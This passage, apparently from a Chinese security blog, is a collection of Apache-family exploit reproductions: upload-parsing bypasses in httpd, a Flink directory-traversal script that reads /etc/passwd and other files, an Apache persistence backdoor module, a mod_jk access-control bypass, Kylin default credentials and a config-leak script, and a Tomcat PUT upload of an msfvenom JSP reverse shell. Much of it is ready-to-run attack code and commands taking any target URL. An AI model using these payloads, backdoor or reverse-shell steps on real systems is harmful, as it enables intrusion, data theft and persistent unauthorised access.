+<pre tabindex=0><code>AddHandler application/x-httpd-php .php
+</code></pre><p>在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀，那么其将被识别为<code>php</code>文件，利用这个特性我们就可以构造绕过上传限制的解析漏洞。</p>
+<h2 id=复现思路-3>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-3>#</a></h2>
+<p>修改文件名为<code>xxx.php.jpg</code>绕过文件上传限制。</p>
+<h2 id=漏洞复现-4>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-4>#</a></h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>git clone https://github.com/vulhub/vulhub.git
+cd vulhub/httpd/apache_parsing_vulnerability
+docker-compose up -d
+</code></pre></div><p>首先正常上传一个<code>php</code>文件，显示<code>文件类型不支持</code>报错。</p>
+<p>将文件后缀改为<code>xxx.php.jpg</code>，成功上传并获取文件路径，访问即可。</p>
+<h1 id=httpd-换行解析漏洞-cve-2017-15715>HTTPd 换行解析漏洞 CVE-2017-15715<a hidden class=anchor aria-hidden=true href=#httpd-换行解析漏洞-cve-2017-15715>#</a></h1>
+<h2 id=漏洞描述-5>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-5>#</a></h2>
+<p><code>Apache HTTPd</code>是一款<code>HTTP</code>服务器，可以通过<code>mod_php</code>来运行<code>PHP</code>网页。其<code>2.4.0 ~ 2.4.29</code>版本存在一个解析漏洞，在解析<code>PHP</code>时，<code>1.php\x0A</code>将被按照<code>PHP</code>后缀进行解析，能够绕过一些服务器的安全策略。</p>
+<h2 id=影响版本-4>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-4>#</a></h2>
+<p><code>Apache HTTPd 2.4.0 ~ 2.4.29</code></p>
+<h2 id=复现思路-4>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-4>#</a></h2>
+<p>抓包给文件后缀加上<code>0a</code>换行符。</p>
+<h2 id=漏洞复现-5>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-5>#</a></h2>
+<p>环境搭建：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>git clone https://github.com/vulhub/vulhub.git
+cd vulhub/httpd/CVE-2017-15715
+docker-compose up -d
+</code></pre></div><p>直接点击上传文件会被拦截，查看配置文件如下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;FilesMatch</span> <span style=color:#960050;background-color:#1e0010>\.php$</span><span style=color:#f92672>&gt;</span>
+	SetHandler application/x-httpd-php
+<span style=color:#f92672>&lt;/FilesMatch&gt;</span>
+
+DirectoryIndex disabled
+DirectoryIndex index.php index.html
+
+<span style=color:#f92672>&lt;Directory</span> <span style=color:#960050;background-color:#1e0010>/var/www</span><span style=color:#f92672>/&gt;</span>
+	Options -Indexes
+	AllowOverride All
+<span style=color:#f92672>&lt;/Directory&gt;</span>
+</code></pre></div><p>前三行配置是将以<code>.php</code>为后缀的文件内容当作<code>PHP</code>代码进行解析，但使用了<code>$</code>进行文件匹配。</p>
+<p><code>$</code>在正则表达式中是匹配字符串中结尾的位置，若存在换行符，则匹配换行符为结尾，可以通过这个缺陷绕过黑名单机制实现文件上传。</p>
+<p>抓包发送至<code>Repeater</code>模块，在文件后缀加上<code>%0a</code>绕过限制，上传成功，访问<code>http://&lt;ip>:&lt;port>/test.php%0a</code>成功触发解析漏洞。</p>
+<h1 id=flink-目录遍历漏洞-cve-2020-17519>Flink 目录遍历漏洞 CVE-2020-17519<a hidden class=anchor aria-hidden=true href=#flink-目录遍历漏洞-cve-2020-17519>#</a></h1>
+<h2 id=漏洞描述-6>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-6>#</a></h2>
+<p>远程攻击者通过<code>REST API</code>目录遍历，可造成文件读写的影响。</p>
+<h2 id=影响版本-5>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-5>#</a></h2>
+<p><code>Apache Flink 1.11.0 ~ 1.11.2</code></p>
+<h2 id=复现思路-5>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-5>#</a></h2>
+<h2 id=漏洞复现-6>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-6>#</a></h2>
+<p><code>FOFA</code>：<code>app="Apache Flink"</code></p>
+<p>环境搭建：<a href=https%EF%BC%9A//github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519>vulhub/flink/CVE-2020-17519 at master · vulhub/vulhub (github.com)</a></p>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+</code></pre><p>漏洞利用<code>POC</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
+<span style=color:#f92672>import</span> sys
+<span style=color:#f92672>import</span> json
+<span style=color:#f92672>from</span> requests.packages.urllib3.exceptions <span style=color:#f92672>import</span> InsecureRequestWarning
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>title</span>():
+    print(<span style=color:#e6db74>&#39;+------------------------------------------&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[34mGithub : https://github.com/PeiQi0                                 </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[34m公众号 : PeiQi文库                                                     </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[34mVersion: Apache Flink   1.11.0-1.11.2                             </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[36m使用格式: python3 CVE-2020-17519.py                                  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[36mFile        &gt;&gt;&gt; /etc/passwd                                        </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+------------------------------------------&#39;</span>)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>POC_1</span>(target_url, file_name):
+    file_name <span style=color:#f92672>=</span> file_name<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>&#34;</span>)
+    vuln_url <span style=color:#f92672>=</span> target_url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/jobmanager/logs/..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(file_name)
+    headers <span style=color:#f92672>=</span> {
+        <span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#34;</span>,
+    }
+    <span style=color:#66d9ef>try</span>:
+        requests<span style=color:#f92672>.</span>packages<span style=color:#f92672>.</span>urllib3<span style=color:#f92672>.</span>disable_warnings(InsecureRequestWarning)
+        response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>=</span>vuln_url, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, headers<span style=color:#f92672>=</span>headers)
+        print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[32m[o] 请求URL : </span><span style=color:#e6db74>{}</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span><span style=color:#f92672>.</span>format(vuln_url))
+        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;root&#34;</span> <span style=color:#f92672>in</span> response<span style=color:#f92672>.</span>text:
+            print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[32m[o] 目标 </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> 存在漏洞,成功读取 /etc/passwd ，响应为：</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{}</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span><span style=color:#f92672>.</span>format(target_url, response<span style=color:#f92672>.</span>text))
+        <span style=color:#66d9ef>else</span>:
+            print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[31m[x] 目标Url漏洞利用失败</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span>)
+            sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
+
+    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+        print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[31m[x] 目标Url漏洞利用失败</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span>)
+        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>POC_2</span>(target_url, file_name):
+    file_name_re <span style=color:#f92672>=</span> file_name<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>&#34;</span>)
+    vuln_url <span style=color:#f92672>=</span> target_url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/jobmanager/logs/..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>%252f</span><span style=color:#e6db74>..</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(file_name_re)
+    headers <span style=color:#f92672>=</span> {
+        <span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#34;</span>,
+    }
+    <span style=color:#66d9ef>try</span>:
+        requests<span style=color:#f92672>.</span>packages<span style=color:#f92672>.</span>urllib3<span style=color:#f92672>.</span>disable_warnings(InsecureRequestWarning)
+        response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>=</span>vuln_url, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, headers<span style=color:#f92672>=</span>headers)
+        print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[32m[o] 请求URL : </span><span style=color:#e6db74>{}</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span><span style=color:#f92672>.</span>format(vuln_url))
+        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;error&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> response<span style=color:#f92672>.</span>text:
+            print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[32m[o] 目标 </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> 存在漏洞,成功读取 </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> ，响应为：</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{}</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span><span style=color:#f92672>.</span>format(target_url, file_name, response<span style=color:#f92672>.</span>text))
+        <span style=color:#66d9ef>else</span>:
+            print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[31m[x] 目标文件</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>读取失败</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span><span style=color:#f92672>.</span>format(file_name))
+
+    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+        print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[31m[x] 目标Url漏洞利用失败</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span>)
+        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+    title()
+    target_url <span style=color:#f92672>=</span> str(input(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[35mPlease input Attack Url</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Url   &gt;&gt;&gt; </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span>))
+    file_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/etc/passwd&#34;</span>
+    POC_1(target_url, file_name)
+
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        file_name <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[35mFile &gt;&gt;&gt; </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span>)
+        <span style=color:#66d9ef>if</span> file_name <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;exit&#34;</span>:
+            sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
+        <span style=color:#66d9ef>else</span>:
+            POC_2(target_url, file_name)
+</code></pre></div><p>使用方式：<code>python3 poc.py</code></p>
+<p><code>Url >>></code>：<code>&lt;ip>：&lt;port></code></p>
+<p><code>File >>></code>：<code>/etc/hosts</code></p>
+<h1 id=后门维持>后门维持<a hidden class=anchor aria-hidden=true href=#后门维持>#</a></h1>
+<h2 id=漏洞描述-7>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-7>#</a></h2>
+<p>通过第三方脚本实现维持后门。</p>
+<h2 id=复现思路-6>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-6>#</a></h2>
+<p>1.上传文件</p>
+<p>2.重启服务</p>
+<p>3.执行脚本</p>
+<h2 id=漏洞复现-7>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-7>#</a></h2>
+<p>工具下载：<a href=https%EF%BC%9A//github.com/ianxtianxt/apache->ianxtianxt/apache-： apache权限维持后门 (github.com)</a></p>
+<p>1.上传mod_backdoor.c到服务器，并执行命令：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>apxs -i -a -c mod_backdoor.c <span style=color:#f92672>&amp;&amp;</span> service apache2 restart
+</code></pre></div><p>2.控制端执行脚本：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python exploit.py &lt;ip&gt; <span style=color:#ae81ff>80</span>
+</code></pre></div><h1 id=mod_jk-访问控制权限绕过-cve-2018-11759>Mod_jk 访问控制权限绕过 CVE-2018-11759<a hidden class=anchor aria-hidden=true href=#mod_jk-访问控制权限绕过-cve-2018-11759>#</a></h1>
+<h2 id=漏洞描述-8>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-8>#</a></h2>
+<p><code>Apache Tomcat JK(mod_jk) Connector</code>是<code>Apache</code>软件基金会为<code>Apache</code>或<code>IIS</code>提供连接后台<code>Tomcat</code>的模块，为<code>Apache</code>或<code>IIS</code>服务器提供处理<code>JSP/Servlet</code>的能力。</p>
+<p>由于<code>httpd</code>和<code>Tomcat</code>在路径处理规范上存在差异，<code>httpd</code>将<code>url</code>中的分号视作路径解析中的普通字符，而<code>Tomcat</code>将其当作查询分隔符(类似"?")。如，攻击者获取到路径：<code>http://server/java_app/.. ;</code>，对<code>httpd</code>来说，这并不会触发服务器并跳转到相应目录，仅仅被原封不动转发到<code>Tomcat</code>，且地址尾部被解析为<code>.. *</code>。这就允许攻击者获取到本不能在<code>Tomcat</code>访问的资源。</p>
+<p><code>jkstatus</code>是<code>mod_jk</code>模块的管理界面，设为读写权限时，允许配置<code>AJP</code>连接<code>Java Web</code>服务器代理<code>HTTP请求</code>，我们可以绕过<code>Apache mod_jk Connector</code>由<code>JkMount httpd</code>指令所定义端点的访问控制限制。如果能访问一个只有只读权限的<code>jkstatus</code>的接口，那么就有可能能够公开由<code>mod_jk</code>模块给<code>AJP</code>提供服务的内部路由。 如果能访问一个具有读写权限的<code>jkstatus</code>接口，我们就能通过修改<code>AJP</code>的配置文件中相关配置来劫持或者截断所有经过<code>mod_jk</code>的流量，或者进行内部端口扫描。</p>
+<h2 id=影响版本-6>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-6>#</a></h2>
+<p><code>Apache Mod_jk Connector 1.2.0 ~ 1.2.44</code></p>
+<h2 id=漏洞复现-8>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-8>#</a></h2>
+<p>环境搭建：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>git clone https://github.com/immunIT/CVE-2018-11759.git
+docker-compose up -d
+</code></pre></div><p>访问<code>http://&lt;ip>:80</code>成功后，访问<code>http://&lt;ip>:80/jkstatus</code>，显示无权限，通常使用如下httpd指令限制对jkstatus的访问：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;Location</span> <span style=color:#960050;background-color:#1e0010>/jkstatus</span><span style=color:#f92672>&gt;</span>
+JKMount jk-status
+Require ip 127.0.0.1
+<span style=color:#f92672>&lt;/Location&gt;</span>
+</code></pre></div><p>在<code>URL</code>后加一个分号即可绕过限制，<code>http://&lt;ip>:80/jkstatus;</code>。</p>
+<p>我们还可在分号之后提交GET参数，向jkstatus请求修改其访问权限的配置，如：<code>http://&lt;ip>:80/jkstatus;?cmd=dump</code>。</p>
+<p>参数若能被解析，其产生的影响就等同于更改工作人员使用的端口来实现对所有由<code>mod_jk</code>供应的应用程序拒绝服务的效果，此外，若攻击者将相应<code>AJP</code>连接到自己的服务器上，就可能劫持所有到由<code>mod_jk</code>供应服务的<code>Web应用</code>的流量。</p>
+<p>从理论上说，将<code>AJP</code>的目标和端口修改为内部主机及其对应端口后，由于<code>httpd</code>和<code>Tomcat</code>的<code>jkstatus</code>返回错误信息不一致，我们能进行内部<code>TCP</code>端口扫描，具体情况取决于提交的<code>AJP</code>端口是否有效。</p>
+<h1 id=kylin-console-控制台弱口令>Kylin Console 控制台弱口令<a hidden class=anchor aria-hidden=true href=#kylin-console-控制台弱口令>#</a></h1>
+<h2 id=漏洞描述-9>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-9>#</a></h2>
+<p>默认账密<code>admin/KYLIN</code>。</p>
+<h2 id=影响版本-7>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-7>#</a></h2>
+<p><code>Apache Kylin</code></p>
+<h2 id=漏洞复现-9>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-9>#</a></h2>
+<p>打开站点输入默认账密。</p>
+<h1 id=kylin-未授权配置泄露-cve-2020-13937>Kylin 未授权配置泄露 CVE-2020-13937<a hidden class=anchor aria-hidden=true href=#kylin-未授权配置泄露-cve-2020-13937>#</a></h1>
+<h2 id=漏洞描述-10>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-10>#</a></h2>
+<p><code>Apache Kylin</code>有一个<code>restful api</code>会在没有任何认证的情况下暴露配置信息。</p>
+<h2 id=影响版本-8>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-8>#</a></h2>
+<p><code>Apahche Kylin 2.x.x</code></p>
+<p><code>Apahche Kylin &lt;= 3.1.0</code></p>
+<p><code>Apahche Kylin 4.0.0-alpha</code></p>
+<h2 id=漏洞复现-10>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-10>#</a></h2>
+<p><code>POC</code>：<code>http://&lt;ip>/kylin/api/admin/config</code></p>
+<p>漏洞检测<code>POC</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>title</span>():
+    print(<span style=color:#e6db74>&#39;+------------------------------------------&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[34mGithub : https://github.com/PeiQi0                                 </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[34m公众号 : PeiQi文库                                                     </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[34mVersion: Apache Kylin 2.x.x &lt;= 3.1.0 Kylin 4.0.0-alpha            </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[36m使用格式: python3 cve-2019-13937.py                                 </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+  </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:9999                            </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+    print(<span style=color:#e6db74>&#39;+------------------------------------------&#39;</span>)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>POC_1</span>(target_url):
+    vuln_url <span style=color:#f92672>=</span> target_url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/kylin/api/admin/config&#34;</span>
+    headers <span style=color:#f92672>=</span> {
+        <span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#34;</span>
+    }
+    <span style=color:#66d9ef>try</span>:
+        response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>=</span>vuln_url, headers<span style=color:#f92672>=</span>headers, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>20</span>)
+        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;config&#34;</span> <span style=color:#f92672>in</span> response<span style=color:#f92672>.</span>text:
+            print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[32m[o] 存在Apache Kylin的未授权配置泄露</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[o] 响应为：</span><span style=color:#ae81ff>\n\033</span><span style=color:#e6db74>[0m&#34;</span>,response<span style=color:#f92672>.</span>text)
+        <span style=color:#66d9ef>else</span><span style=color:#960050;background-color:#1e0010>：</span>
+            print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[31m[x] 目标Url漏洞利用失败</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span>)
+    <span style=color:#66d9ef>except</span>:
+        print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[31m[x] 目标Url漏洞利用失败</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span>)
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+    title()
+    target_url <span style=color:#f92672>=</span> str(input(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[35mPlease input Attack Url</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Url &gt;&gt;&gt; </span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#34;</span>))
+    POC_1(target_url)
+</code></pre></div><h1 id=rce-cve-2017-12615>RCE CVE-2017-12615<a hidden class=anchor aria-hidden=true href=#rce-cve-2017-12615>#</a></h1>
+<h2 id=漏洞描述-11>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-11>#</a></h2>
+<p><code>conf/web.xml</code>文件配置错误中的<code>readonly</code>参数默认为<code>false</code>，攻击者可以使用<code>PUT/DELETE</code>请求方法操作文件。如通过精心构造的攻击请求数据包向服务器上传包含任意代码的<code>JSP</code>文件，<code>JSP</code>文件中的恶意代码将能被服务器执行，导致服务器数据泄露或获取服务器权限。</p>
+<h2 id=影响版本-9>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-9>#</a></h2>
+<p><code>Apache Tomcat 7.0.0 ~ 7.0.81</code></p>
+<h2 id=复现思路-7>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-7>#</a></h2>
+<p>1.<code>msf</code>生成<code>jsp</code>马</p>
+<p>2.<code>PUT</code>上传文件</p>
+<h2 id=漏洞复现-11>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-11>#</a></h2>
+<p>环境搭建：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gitclone https://github.com/vulhub/vulhub.git
+cd vulhub/tomcat/CVE-2017-12615
+docker-compose up -d
+</code></pre></div><p><code>msf</code>生成<code>jsp</code>马：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style=color:#f92672>=</span>&lt;ip&gt; LPORT<span style=color:#f92672>=</span>&lt;port&gt; -f raw &gt; shell.jsp
+</code></pre></div><p><code>PUT</code>上传<code>jsp</code>马：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -v -X PUT --data-binary @shell.jsp <span style=color:#e6db74>&#34;http：//&lt;ip&gt;:&lt;port&gt;/shell.jsp/&#34;</span>
+</code></pre></div><h1 id=shiro-反序列化漏洞-cve-2016-4437>Shiro 反序列化漏洞 CVE-2016-4437<a hidden class=anchor aria-hidden=true href=#shiro-反序列化漏洞-cve-2016-4437>#</a></h1>
